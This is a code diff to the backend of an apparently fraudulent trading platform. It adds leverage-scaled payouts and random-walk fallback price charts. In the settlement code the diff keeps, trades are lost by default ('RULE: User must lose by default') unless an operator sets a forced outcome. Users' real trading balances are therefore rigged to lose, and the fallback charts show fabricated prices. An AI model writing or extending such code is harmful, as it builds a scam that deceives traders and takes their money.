@@ -183,6 +183,7 @@ const initializeDatabase = async () => {
         direction TEXT NOT NULL,
         amount DECIMAL(24, 8) NOT NULL,
         entry_price DECIMAL(24, 8) NOT NULL,
+        leverage INTEGER DEFAULT 10,
         duration INTEGER NOT NULL,
         status TEXT DEFAULT 'pending',
         force_outcome TEXT,
@@ -191,6 +192,13 @@ const initializeDatabase = async () => {
         settled_at TIMESTAMPTZ
       )
     `);
+
+    // Ensure leverage column exists for existing tables
+    try {
+      await pool.query("ALTER TABLE trades ADD COLUMN IF NOT EXISTS leverage INTEGER DEFAULT 10");
+    } catch (e) {
+      console.warn('[DB] Could not add leverage column:', e.message);
+    }
 
     await pool.query(`
       CREATE TABLE IF NOT EXISTS withdrawal_requests (
@@ -285,7 +293,9 @@ const initializeDatabase = async () => {
           else if (trade.force_outcome === 'loss') isWin = false;
           else isWin = false; // Always fail by default
 
-          const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
+          const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
+          const payoutRate = 0.85;
+          const payout = isWin ? parseFloat(trade.amount) * (1 + (payoutRate * leverageFactor)) : 0;
           const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
 
           await pool.query(
@@ -610,8 +620,18 @@ app.get('/api/binance/klines', async (req, res) => {
     // Fallback: Minimal mock data to prevent blank screen
     const now = Math.floor(Date.now() / 60000) * 60000;
     const mock = [];
+    let p = 50000;
     for(let i=100; i>=0; i--) {
-        mock.push([now - i*60000, 50000, 50100, 49900, 50050]);
+        const o = p;
+        const c = p + (Math.random() - 0.5) * 100;
+        mock.push([
+            now - i*60000, 
+            o, 
+            Math.max(o, c) + 20, 
+            Math.min(o, c) - 20, 
+            c
+        ]);
+        p = c;
     }
     return res.json(mock);
   }
@@ -1129,9 +1149,9 @@ app.post('/api/execute-trade', async (req, res) => {
 
     // Insert trade record
     await pool.query(
-      `INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, duration, is_demo, status)
-       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'pending')`,
-      [tradeId || Math.random().toString(36).substring(7), walletAddress, asset, type, amt, entryPrice, duration, isDemo || false]
+      `INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, leverage, duration, is_demo, status)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'pending')`,
+      [tradeId || Math.random().toString(36).substring(7), walletAddress, asset, type, amt, entryPrice, leverage || 10, duration, isDemo || false]
     );
 
     // Record transaction
@@ -1169,7 +1189,11 @@ app.post('/api/settle-trade', async (req, res) => {
     else isWin = false; // RULE: User must lose by default
 
     const finalStatus = isWin ? 'won' : 'lost';
-    const finalPayout = isWin ? parseFloat(payout) : 0;
+    
+    const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
+    const payoutRate = 0.85;
+    const finalPayout = isWin ? parseFloat(trade.amount) * (1 + (payoutRate * leverageFactor)) : 0;
+    
     const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
 
     // Update trade record
